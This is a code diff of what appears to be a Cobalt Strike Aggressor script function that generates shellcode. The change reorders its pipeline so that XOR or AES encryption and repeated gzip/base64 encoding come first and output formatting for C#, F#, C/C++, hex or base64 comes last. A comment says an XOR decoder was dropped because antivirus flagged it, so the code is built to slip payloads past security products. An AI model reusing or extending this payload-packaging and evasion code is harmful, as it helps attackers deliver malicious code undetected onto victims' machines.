@@ -121,38 +121,6 @@ sub shellcode_gen {
 		# Get raw shellcode size in bytes
 		$sc_size = strlen($shellcode);
 
-		###### Formatting Section
-
-		# RAW/No Formatting
-		if ($3['format'] eq "raw") {
-			$format_shellcode = $shellcode;
-		}
-
-		# hex format
-		if ($3['format'] eq "hex") {
-			$format_shellcode = transform($shellcode, "hex");
-		}
-		
-		# c# format
-		if ($3['format'] eq "0x90\,0x90,\0x90") {
-			$format_shellcode = format_csharp($shellcode);
-		}
-
-		# f# format
-		if ($3['format'] eq "0x90uy\;0x90uy\;0x90uy") {
-			$format_shellcode = format_fsharp($shellcode);
-		}
-
-		# c/cpp format
-		if ($3['format'] eq "\\x90\\x90\\x90") {
-			$format_shellcode = format_cpp($shellcode);
-		}
-
-		# early b64 encoding option
-		if ($3['format'] eq "b64") {
-			$format_shellcode = base64_encode($shellcode);
-		}
-
 		###### Encryption Section
 
 		# Error if multiple encryption types are selected
@@ -163,12 +131,12 @@ sub shellcode_gen {
 		
 		# No Encryption
 		if ($3['XOR'] eq "false" && $3['AES'] eq "false") {
-			$encrypted_shellcode = $format_shellcode
+			$encrypted_shellcode = $shellcode
 		}
 		
 		# XOR Encryption
 		if ($3['XOR'] eq "true") {
-			$encrypted_shellcode = str_xor($format_shellcode, $xorkey);
+			$encrypted_shellcode = str_xor($shellcode, $xorkey);
 			# Save XOR key to a file
 			$xorkey_resource = openf(">".script_resource($XORKEY)."");
 			writeb($xorkey_resource, $xorkey);
@@ -180,15 +148,15 @@ sub shellcode_gen {
 		
 		# AES Encryption
 		if ($3['AES'] eq "true") {
-			# Write $format_shellcode to a file for encryption
-			$formatted_resource = openf(">".script_resource($FORMATTED)."");
-			writeb($formatted_resource, $format_shellcode);
-			closef($formatted_resource);
+			# Write $shellcode to a file for encryption
+			$resource = openf(">".script_resource($FORMATTED)."");
+			writeb($resource, $shellcode);
+			closef($resource);
 			# Save AES key to a file
 			$key_resource = openf(">".script_resource($AESKEY)."");
 			writeb($key_resource, $aeskey);
 			closef($key_resource);
-			# Use AES python script to encrypt the formatted shellcode file
+			# Use AES python script to encrypt the shellcode file
 			$aes_python = script_resource(($AESPYTHON)."");
 			$in_file = script_resource(($FORMATTED)."");
 			$out_file = script_resource(($ENCRYPTED)."");
@@ -203,10 +171,12 @@ sub shellcode_gen {
 			show_message("AES key used is: $aeskey");
 		}
 
+
 		# position-independent blob of xor shellcode with an embeded decoder
 		# DID NOT USE, xor decoder flagged by AV
-		#$encoded_shellcode = encode($format_shellcode, "xor", $arch);
-		
+		#$encoded_shellcode = encode($encrypted_shellcode, "xor", $arch);
+
+
 		###### Encoding and Compression section
 
 		# No additional encoding/compression
@@ -239,18 +209,50 @@ sub shellcode_gen {
 			$encoded_shellcode = gzip(gzip(gzip(gzip(gzip(gzip(gzip(base64_encode($encrypted_shellcode))))))));
 		}
 
+		###### Formatting Section
+
+		# RAW/No Formatting
+		if ($3['format'] eq "raw") {
+			$format_shellcode = $encoded_shellcode;
+		}
+
+		# hex format
+		if ($3['format'] eq "hex") {
+			$format_shellcode = transform($encoded_shellcode, "hex");
+		}
+		
+		# c# format
+		if ($3['format'] eq "0x90\,0x90,\0x90") {
+			$format_shellcode = format_csharp($encoded_shellcode);
+		}
+
+		# f# format
+		if ($3['format'] eq "0x90uy\;0x90uy\;0x90uy") {
+			$format_shellcode = format_fsharp($encoded_shellcode);
+		}
+
+		# c/cpp format
+		if ($3['format'] eq "\\x90\\x90\\x90") {
+			$format_shellcode = format_cpp($encoded_shellcode);
+		}
+
+		# early b64 encoding option
+		if ($3['format'] eq "b64") {
+			$format_shellcode = base64_encode($encoded_shellcode);
+		}
+
 		###### Multiline Output Section
 
 		if ($3['multiline'] eq "none") {
-		$final_shellcode = $encoded_shellcode;
+		$final_shellcode = $format_shellcode;
 		}
 
 		if ($3['multiline'] eq "quoted") {
-		$final_shellcode = format_multiline($encoded_shellcode);
+		$final_shellcode = format_multiline($format_shellcode);
 		}
 
 		if ($3['multiline'] eq "chunks.push_back") {
-		$final_shellcode = format_chunks($encoded_shellcode);
+		$final_shellcode = format_chunks($format_shellcode);
 		}
 
 		###### Shellcode writing section
